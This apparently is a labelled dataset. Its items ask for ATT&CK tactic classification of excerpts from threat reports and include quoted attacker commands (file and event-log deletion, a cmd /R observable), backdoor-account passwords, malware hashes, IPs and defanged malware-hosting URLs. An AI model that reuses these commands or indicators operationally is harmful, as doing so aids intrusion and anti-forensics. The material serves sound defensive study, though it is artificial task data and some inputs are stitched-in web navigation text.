        "input": "Described attack activity: T1037 Boot or Logon Initialization Scripts \nT1053.005 Scheduled Task T1055 Process Injection   \nT1068 Exploitation for Privilege Escalation   \nT1078 Valid Accounts T1078.002 Domain Accounts T1078.004 Cloud Accounts   \nT1134 Access Token Manipulation T1134.001 Token Impersonation/Theft   \nT1484 Domain Policy Modification T1484.001 Group Policy Modification   \nT1543 Create or Modify System Process T1543.002 Systemd Service T1543.003 Windows Service   \nT1546 Event Triggered Execution T1546.003 Windows Management Instrumentation Event Subscription T1546.012 Image File Execution Options Injection   \nT1547 Boot or Logon Autostart Execution T1547.001 Registry Run Keys / Startup Folder T1547.004 Winlogon Helper DLL T1547.009 Shortcut Modification \nT1574 Hijack Execution Flow T1574.011 Services Registry Permissions Weakness ",
        "output": "privilege escalation",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The ransomware is deployed using the following command:\n# ./sample <target folder> -id <32 character ID> [other command line parameters]\nA target folder must be selected. Otherwise, the sample will exit before encryption. The sample we examined does not have a folder exclusion list, meaning that running the ransomware on the root folder with root privileges would corrupt the operating system. These attributes suggest that the ransomware is executed either manually or by a dropper program that specifies which folders should be encrypted. A simple execution flow looks like this:\n1)Encryption test:The program runs an encryption test before doing anything else. This is probably a quality assurance function to ensure that file encryption will be clean and not corrupt the files. This could indicate that the threat actor is serious about the business and wants to ensure that recovery is possible.\n2)Command line parameters: The program parses the command line parameters and stores their values for the rest of the execution.\n3)Initializing a thread pool(Figure 2): A thread pool is created to execute encryption later. A separate thread is created for every online CPU core the machine has. Each thread runs the same thread_func() function.\n4)Searching target files:search_files()function starts from the selected root directory and recursively searches for files. The exclusion list shown in Figure 3 ensures that files that were previously encrypted are not encrypted again and that the ransom note (readme) is not encrypted. The full path of allowed files is put in a queue to enqueue them for the worker threads.\n5)Encryption: Threads in the thread pool monitor the queue of target files. When something is in the queue, a worker thread will pop the file from there and start encryption. The encryption is described in detail in the next section.\n6)Renaming: As a final step, files are renamed to include the.royal_upostfix (Figure 4).",
        "output": "execution",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We did not witness collection events but we do believe files were collected and exfiltrated over encrypted C2 channels.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Palo Alto NetworksTraps Advanced Endpoint Protectionrecently prevented recent attacks that we believe are part of a campaign linked toDustySky. DustySky is a campaign which others haveattributedto the Gaza Cybergang group, a group that targetsgovernment interestsin the region.\nThis report shares our researchers' analysis of the attack and Remote Access Tool (RAT). We also discovered during our research that the RAT Server used by this attacker is itself vulnerable to remote attack, a double-edged sword for these attackers.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Starting as early as October 10, 2022, UNC4841 sent emails to victim organizations that contained specially crafted TAR file attachments designed to exploit CVE-2023-2868 to gain initial access to vulnerable Barracuda ESG appliances. In initial emails, UNC4841 attached files with a \".tar\" extension in the filename, whereas in later emails they used different file extensions such as \".jpg\" or \".dat\". Regardless of file extension, the observed attachments were valid TAR files that exploited CVE2023-2868. \nObserved emails contained generic email subject and body content, usually with poor grammar and in some cases still containing placeholder values. Mandiant assesses UNC4841 likely crafted the body and subject of the message to appear as generic spam in order to be flagged by spam filters or dissuade security analysts from performing a full investigation. Mandiant has observed this tactic utilized by advanced groups exploiting zero-day vulnerabilities in the past. \nSome examples are shown in Figure 2. \nUNC4841 used several different methods to deliver their emails to targeted appliances. In some cases, UNC4841 spoofed email \"from\" addresses that were for non-existent domains. In other cases, Mandiant observed the actor use addresses with domains that were likely not in use or that we suspect they did not control. \nBased on analysis of email headers, Mandiant identified the actor sending emails from a Vultr VPS server (216.238.112[.]82). Mandiant also observed source IP addresses with no notable characteristics or history. In one case, email headers indicated that an email originated from an IP address allocated to China Telecom (101.229.146[.]218). Additionally, Mandiant identified the use of a mail client in the xmailer header that was found to be low-prevalence and that we have observed in use by another Chinanexus espionage actor to send phishing emails. \nMandiant also obtained exploit emails that indicated the actor had used email addresses that belonged to an organization that was also found to have a \ncompromised Barracuda ESG appliance. \nFurthermore, UNC4841 was observed sending emails from compromised appliances to exploit or interact with backdoored modules on other compromised appliances. Although we do not have conclusive evidence, execution artifacts on a subset of impacted appliances indicate that UNC4841 is using a utility named \"CSmtp\" that we suspect is a command line utility to send emails. \nNote that at the time of writing, Mandiant has only reviewed a small subset of exploit emails sent by UNC4841. As a result, these findings may not be representative of all emails sent by the actor. ",
        "output": "initial access",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor utilized both account creation and scheduled tasks to gain persistence in the environment.\nNew account creation\nDuring the first activity, we observed the use ofuser.exeexecutable that ran the following PowerShell command:\nThe first thing they did was make a new user namedDefaultAccountwith the passwordP@ssw0rd123412. They then activated the account and changed the password (P@ssw0rd12341234) for the second time. Finally the commands added the new account to the Administrators group and Remote Desktop Users group.\nThe threat actors ran the same command again two days later:\nDue to the close proximity between executed commands, we assess that the threat actors used tools to automate the execution and discovery phases of this attack.\nScheduled task\nAs previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.\nBelow, we can observe the content ofwininet.xml:\nThe following commands where then ran to initiate the task and to achieve persistence:",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Building this snapshot fuzzing environment on top of WTF provides several benefits. It enables us to perform precisely targeted fuzz testing of, otherwise, hard-to-pinpoint chunks of macOS kernel. We can perform the actual testing on commodity CPUs, which enables us to use our existing computer resources instead of being limited to a few cores. Additionally, although emulated execution speed is fairly slow, we can leverage Bosch to perform more complex instrumentation. \nPatches to Volatility and WTF projects, as well as additional support tooling, is available in our GitHub repository. \nSmall praise for modern compilers - A case of Ubuntu printing vulnerability that wasn't \nF E B R UA RY 1 0 , 2 0 2 5 0 8 : 3 0 \nDuring an earlier investigation of the macOS printing subsystem, IPP-USB protocol caught our attention.   \nWe decided to take a look at how other operating systems handle the same functionality. \nFinding vulnerabilities in ClipSp, the driver at the core of Windows' Client License Platform \nN OV E M B E R 2 5 , 2 0 2 4 0 8 : 0 0 \nBy Philippe Laulheret ClipSP (clipsp.sys) is a Windows driver used to implement client licensing and system policies on Windows 10 and 11 systems. Cisco Talos researchers have discovered eight vulnerabilities related to clipsp.sys ranging from signature bypass to elevation of privileges and sandbox escape: \\* TALOS-2024-1964 (CVE-2024-38184) \\* TALOS-2024-1965 (CVE-2024-38185) \nThe vulnerabilities we uncovered by fuzzing \u00b5C/OS protocol stacks AU G U S T 2 8 , 2 0 2 4 1 2 : 0 0 \nFuzzing has long been one of our favorite ways to search for security issues or vulnerabilities in software, but when it comes to fuzzing popular systems used in ICS environments, it traditionally involved a custom hardware setup to fuzz the code in its native environment. \nINTELLIGENCE CENTER Intelligence Search Email & Spam Trends \nVULNERABILITY RESEARCH Vulnerability Reports Microsoft Advisories ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1059.003 Command and Scripting Interpreter (Windows Command Shell) \nDescription: \nRaspberry Robin uses the \"standard-in\" command prompt feature cmd/R $\\prec$ to read and execute a file with a name composed of several seemingly random alphanumeric characters \nObservable : \nC:\\Windows\\system32\\cmd.exe\" /R CMD<lAkTp.mY0 ",
        "output": "execution",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To deceive the user, the loader mimicked the legitimate Microsoft Windows Media Configuration Utility by using the same file name and executable icon.\nAs part of their defense evasion strategy, the threat actor employed several methods to disable Windows Defender. While on a file server, the threat actor edited the group policy setting related to Windows Defender. Threat actor opening group policy:\nSection of interest to threat actor:\nRegistry modification observed minutes later on the host:\nThe command shown below utilizes WMIC to remotely create a process on a backup server. This process then executes a PowerShell script designed to disable real-time monitoring in Windows Defender.\nProcess injection into various legitimate processes on several systems was observed using the CreateRemoteThread API call. This occurred with both the initial access file and later with various PowerShell Cobalt Strike beacons.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Rather than build custom solutions, Unit 29155 cyber actors use common red teaming techniques and publicly available tools to conduct cyber operations. As a result, many TTPs overlap with those of other cyber actors, which can lead to misattribution. \nUnit 29155 actors and their cyber-criminal affiliates commonly maintain accounts on dark web forums; this has provided the opportunity to obtain various hacker tools such as malware and malware loaders [T1588.001] like Raspberry Robin and SaintBot. While Unit 29155 cyber actors are best known for their use of WhisperGate malware against Ukraine, the use of WhisperGate is not unique to the group. Technical analysis can be found in Appendix A: WhisperGate Malware Analysis. ",
        "output": "other",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors mainly used Remote Desktop Services (RDP) to move laterally to other servers using the stolen domain admin account. Below is an extract focusing on RDP activity from patient 0:\nThe threat actors also appeared to use Impacket's wmiexec to perform lateral movement on one of the domain controllers.\nWe do not have a clear explanation for that behavior. However, we strongly believe that this was related to the deployment of the encryption script, as it happened just a few minutes before its manual execution on servers.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1033 System Owner/User Discovery, T1049 System Network Connections   \nDiscovery| Use of whoami, netstat, ipconfig   \nT1016System Network Configuration Discovery | Use of modified nbtscan   \n002 Permission Groups Discovery: Domain Groups| Discovering domain   \ngroups with net users /domain ",
        "output": "discovery",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: When, the threat actors returned two days later, the final payloads were staged by the threat actors on a domain controller in the following location:\nTwo batch scripts were executed on the domain controller to automate ransomware deployment via PSExec. The first was \"_COPY.bat\", to stage the CONTI ransomware payload on all domain-joined computers. The second was \"_EXE.bat\", to execute the staged CONTI payloads.\nThe batch scripts ran as expected a set of copy commands and then executed the Conti payload using psexec.\nFiles were then encrypted with the following extension [KCRAO]:\nA readme.txt file was created in each folder:\nThe content of readme.txt:",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.\n6804cff68d9824efeb087e1d6ff3f98ed947f002626f04cf8ae7ef26b51e394b \u2013 Bumblebee\ndaf055e5c7f843a3dbe34c3c7b848e5bbe9c53b65df2556b4b450390154af3bb - Bumblebee\n7259b7a91df7c9bc78b0830808fe58c6ff66aa79bb856cf1bf50a107875b3651 \u2013 Bumblebee\nac20f3f9ed0c1e6b2160976a1dc4167e53fbb8c71b4824a640131acf24c71bfd - Bumblebee\n71f91acc6a9162b600ff5191cc22f84a2b726050a5f6d9de292a4deeea0d9803 \u2013 Bumblebee\nf06566e1e309123e03a6a65cdfa06ce5a95fdd276fb7fcbcb33f5560c0a3cd8c \u2013 Cobalt Strike\n2e349b3224cc0d958e6945623098c2d28cc8977e0d45480c0188febbf7b8aa78 \u2013 Bumblebee\n302a25e21eea9ab5bc12d1c5f9e5c119619e617677b307fe0e3044c19581faea \u2013 Likely Bumblebee\n65e205b500160cbec44911080621d25f02ad7fcfcf2c3e75ce33f6f821a808b8 - Bumblebee-related DLL\n905e87d8433fa58f3006ee685bb347024b46550a3ceda0777016f39e88519142 - Bumblebee-related DLL\n6727d493d4ecc8cca83ed8bf7af63941175decff7218e599355065ae6c9563c4 - Bumblebee-related DLL\nc8db63bfab805179a1297f8b70a90a043581c9260e8c97725f4920ab93c03344 - Bumblebee-related DLL\n261b06e30a4a9960e0b0ae173486a4e456c9bd7d188d0f1c9c109bb9e2281b59- Bumblebee-related DLL\n24bf01c1a39c6fcab26173e285d226e0c2dcd8ebf86f820f2ba5339ac29086e5 - Bumblebee-related DLL\n86d7f7b265aae9eedb36bc6a8a3f0e8ec5fa08071e2e0d21774a9a8e3d4ed9e7 - Bumblebee-related DLL\n4c3d85e7c49928af0f43623dcbed474a157ef50af3cba40b7fd7ac3fe3df2f15 \u2013 Unconfirmed, possible VM detection tool\nb1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682 - AdFind\n9d0fa4b88e5b36b8801b55508ab7bc7cda9909d639d70436e972cb3761d34eda - AdFind\naf.bat 1e7737a57552b0b32356f5e54dd84a9ae85bb3acff05ef5d52aabaa996282dfb \u2013 af.bat\nadf.bat 5a1b3f9589b468a06e9427eae6b0a855d1df6cb35ab71ddbfa05279579e9cda3 \u2013 adf.bat\nee5fbc193f875a2b8859229508ca79a2ffe19d8a120ae8c5ca77b1d17233d268 - wab.exe\n5ad4fa74e71fb4ce0a885b1efb912a00c2ce3c7b4ad251ae67e6c3a8676ede02 - wabmig.exe\n02ea7b9948dfc54980fd86dc40b38575c1f401a5a466e5f9fbf9ded33eb1f6a7 - wabmig.exe\nb722655b93bcb804802f6a20d17492f9c0f08b197b09e8cd57cf3b087ca5a347 - imagingdevices.exe\na60136d7377bc1ba8c161021459e9fe9f49c692bf7b397fea676211a2da4444d \u2013 Malicious MSI file\n86c564e9fb7e45a7b0e03dd5a6e1c72b7d7a4eb42ebe6aa2e8f8a7894bed4cb5 \u2013 VBS file\n1825e14e1ea19756b55b5ccec5afbb9c2dba0591403c553a83c842bb0dd14432 - ConnectWise\n3dea930cfb0ea48c2ce9f7a8bd98ee37e2feca5fb4da8844890fa2d4f62dd105 - Atera\n52f145a4ccc0f540a130bedbf04370a842daff1ee8d8361c75a8e0d21a88cf5a - Atera\nupdate.exe 3b7512cfa21bd65bd5beecc8cb859ab4f7f5538f3caaf0703a68ec14389b357a - ConnectWise\n4c6a865771fdb400456b1e8bc9198134ac9d2f66f1654af42b4b8fc67ae018f2 - ConnectWise\nfef7d54d6c09a317d95300d10ffcc6c366dbb8f5ebf563dec13b509fff361dc1 - ConnectWise\n165b491e5b9e273a61c16de0f592e5047740658c7a2e3047f6bf518a17e59eca - ConnectWise\na8faf08997e11a53f9d38797d997c51c1a3fcf89412c3da8dcca6631c6f314a8 - ConnectWise\n01e22210e07708c0b9a0061d0f912041808e48bb8d59f960b545d0b9e11d42d2 - ConnectWise\nf5218aaa046776a12b3683c8da4945a0c4c0934e54802640a15152d9dae15d43 - ConnectWise\nbc41569c4c9b61f526c78f55993203806d09bb8c3b09dbbeaded61cd1dc2fcc2 - caexec.exe (likely similar to PAExec)\n29767c912919cb38903f12c7f41cdd1c5f39fccb9641302c97b981e4b5e31ee5 - vSphere PowerCLI component\n911c152d4e37f55bd1544794cc324364b6f03aff118cdf328127355ccc25282a - vSphere PowerCLI component\nf5cd44f1d72ef8fc734c76ca62879e1f1cb4c0603cfdc0b85b5ad6ad8326f503 - vSphere PowerCLI component\n0650722822e984da41d77b90fbd445f28e96a90af87043581896465c06ed1e44 \u2013 ConnectWise\nf01a3f2186e77251acfac9d53122a1579182bde65e694487b292a8e09cf8d465 \u2013 Cobalt Strike\n290b698d41525c4c74836ca934c0169a989a5eafde7208d90300a17a3f5bd408 \u2013 Ransom.Quantum\n3d41a002c09448d74070a7eb7c44d49da68b2790b17337686d6dd018012db89d \u2013 Ransom.Quantum\n51.68.146.200 - AS16276 OVH SAS\n154.56.0.221 - AS60602 Inovare-Prim SRL\n3.85.198.66 - AS14618 AMAZON-AES\n3.144.143.242 - AS16509 AMAZON-02\nadaptivenet[.]hostedrmm[.]com\nhxxp://127.0.0[.]1:[high-ephemeral-port]/\nhxxps://ec2-3-144-143-242.us-east-2.compute.amazonaws[.]com\nhxxps://ec2-3-85-198-66[.]compute-1.amazonaws[.]com\nadaptivenet[.]hostedrmm[.]com / 52.53.233.237 - AS16509 AMAZON-02\nhxxp://adaptivenet[.]hostedrmm[.]com/LabTech/Updates/LabtechUpdate_220.124.zip\nhxxp://adaptivenet[.]hostedrmm[.]com/LabTech/Updates/LabtechUpdate_220.77.zip\nhxxp://adaptivenet[.]hostedrmm[.]com/LabTech/transfer/tools/caexec.exe\nhxxp://adaptivenet[.]hostedrmm[.]com/LabTech/Deployment.aspx?Probe=79EA559BB87BF3C8403C40586993D4AC&ID=660\nURLs containing URI string \"/LabTech/\"\n45.153.243.93 \u2013 Bumblebee C&C",
        "output": "other",
        "source": "Symentec"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The malware copies itself to C: \\Users\\User\\AppData\\Roaming\\<INSTALL NAME>. exe and adds this path to HKCU\\Software\\Microsoft \\Windows\\CurrentVersion\\Run. By default the <INSTALL_NAME> is images.exe, but Warzone's builder allows specifying any name of this executable file. \nIt also creates a registryhive HKCUSoftwareMicrosoftWindowsCurrentVersion\\Explorer\\UIF2IS2OVK and puts a pseud-random generated sequence of 256 bytes under the inst value there. \nIf the malware was run without Admin privilege and it hasn't been already terminated by its elevated instance, it copies itself to C: \\ProgramData\\<PREDEFINED NAME> and simply runs itself again from the new location. ",
        "output": "persistence",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Obfuscated Files or Information: Software Packing  T1027.002 \nBeing discreet and staying in the victim's network unnoticed for as long as possible is the goal of any APT. How did APT41 members try to avoid being noticed and cover their tracks? The threat actors used the well-known protection tool Themida to obfuscate their malicious files. \nIndicator Removal on Host: File Deletion  T1070.004 \nWhen certain files were no longer needed, the attackers deleted them. \ndel C:\\temp\\LxpSvc.exe del c:\\users\\public\\BadPotatoNet4.exe del\\\\172.16.2.21\\c\\$\\users\\Public\\SecurityHealthSystray.dll del\\\\172.16.2.21\\c\\$\\users\\Public\\SecurityHealthSystra.ocx copy\"C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx\" \"C:\\PerfLogs\\mwt.evtx\"C:\\PerfLogs\\mwt.evtx rm C:\\PerfLogs\\mwt.evtx\nFile and Directory Permissions Modification: Windows File and Directory Permissions Modification  T1222 \nImpair Defenses: Indicator Blocking  T1562.006 \nAs mentioned earlier, Cobalt Strike was the main tool used in all the campaigns. \nThe threat actors developed a custom injector that makes it possible to bypass Event Tracing for Windows (ETW), thereby making the process invisible to the logging system in Windows. \nThe second noteworthy feature of this injector is a method taken from an open GitHub repository. The idea is to be able to launch a new process in a way as to ensure that neither Windows nor antivirus software can inject their binaries into this process, which enables the threat actors to bypass built-in antivirus tools. \nThe tool is called StealthMutant and it has been described in detail by researchers at Trend Micro. ",
        "output": "defense evasion",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Since BugSleep is a new implant and weekly releases were observed being deployed, this protocol might change and bypass these rules. However, two things have been accomplished: \n1. This variant will no longer communicate over our customers' networks.   \n2. Attackers must invest development time and money to use BugSleep again. \nThe published Snort SIDs covering this traffic are 63937 and 63938. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the first domain controller that the treat actors connected to after their initial connection, they dropped a DLL and executed it via rundll32.\nDropped via RDP and executed via rundll32 on the second domain controller.\nShortly after, the DLL was called again via regsrv32.\nThen a 2nd DLL was dropped and executed in a similar manner on the 2nd DC.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: NCC Group has observed disruption and destruction to client environments by $L A P S U S\\$8$ such as shutting down virtual machines from within on-premises VMware ESXi infrastructure, to the extreme of mass deletion of virtual machines, storage, and configurations in cloud environments making it harder for the victim to recover and for the investigation team to conduct their analysis activities. \nThe theft of data reported appears to heavily be focused on application source code or proprietary technical information. With a targeting of internal source code management or repository servers. These git repositories can contain not only commercially sensitive intellectual property, but also in some cases may include additional API keys to sensitive applications including administrative or cloud applications. ",
        "output": "impact",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Although we lack concrete evidence regarding the initial access vector, the presence of multiple webshells (as shown in Table 1 and described in theWebshellssection) and the tactics, techniques, and procedures (TTPs) used by the Gelsemium APT group in recent years, we conclude with medium confidence that the attackers exploited an unknown web application vulnerability to gain server access.\nTable 1. Webshells found in analyzed archives",
        "output": "initial access",
        "source": "Weblive"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ATT&CK Technique : Application Layer Protocol: Web Protocols (T1071.001) \nATT&CK Technique : Remote Access Software (T1219) \nATT&CK Technique: Encrypted Channel: Asymmetric Cryptography (T1573.002) \nATT&CK Technique : Proxy: Multi-hop Proxy (T1090.003) ",
        "output": "command and control",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: While processing the IOCTL_REQUEST packets, function smb2_dispatch_ioctl_request is invoked with supplied packet bytes as its arguments. In turn, it calls smb2::extract(uchar \\*&,uchar \\* const&,smb2::ioctl_request &,uchar \\* const&) which extracts different fields from the packet into IOCTL_REQUEST structure. \nA code path exists in \"smb2::extract\" that can leave a stack buffer uninitialized while still succeeding. This pointer actually resides on the calling function's stack, is uninitialized and contains random data. When it is subsequently used, it can lead to a crash or further memory corruption if contents can be controlled. \nUninitialized stack variables are rarely exploitable, so to demonstrate control over the uninitialized stack area, the attached PoC constructs a special, compound, SMB command. To control the stack contents, we need to find a function that gives us control of its own stack. A prime candidate for this is the smb2_dispatch_tree_connect function, which is perfect for this task because it has a large stack frame and directly copies packet data onto its stack. Different SMB messages in a compound SMB message are processed in the same thread, meaning the stack memory initialized by \"TREE_CONNECT\" will subsequently be utilized by \"IOCTL_REQUEST\" and we can therefore achieve control of the uninitialized variable. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In the above screenshot, the threat actor executes wbw.xml which then downloads and executes 1.ps1.\nThe script starts off by setting parameters, such as the download locations for XMRig and its config.\nThe script then downloads and executes XMRig, renames it to sysupdate and then sets a schedule task, which runs update.ps1. There was no script located in this directory but we assume one would show up when the miner needed to be updated, if the threat actor still had access.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Traffic from the pcap related to the IcedID infection:\nhxxp://80.77.24[.]175/main.php \nhxxps://firebasestorage.googleapis[.]com/v0/b/serene-cathode-377701.appspot.com/o/XSjwp6O0pq%2FScan_Inv.zip?alt=media&token=a716bdce-1373-44ed-ae89-fdabafa31c61 \n192.153.57[.]223:80-hxxp://skigimeetroc[.]com/ \n104.168.53[.]18:443-askamoshopsi[.]com- HTTPS traffic \n217.199.121[.]56:443-skansnekssky[.]com- HTTPS traffic \n193.149.176[.]100:443- BackConnect traffic\nFiles associated with traffic from this IcedID infection:\nSHA256 hash:fc96c893a462660e2342febab2ad125ce1ec9a90fdf7473040b3aeb814ba7901 \nFile size: 262,343 bytes \nFilename:Scan_Inv.zip \nFile description: Password-protected ZIP archive hosted on Firebase Storage URL \nPassword: 1235 \nMalwareBazaar Database sample \nSHA256 hash:bd24b6344dcde0c84726e620818cb5795c472d9def04b259bf9bff1538e5a759 \nFile size: 333,408 bytes \nFilename:Scan_Inv.exe \nFile description: Windows executable file for IcedID installer \nMalwareBazaar Database sample",
        "output": "other",
        "source": "Palo"
    }
]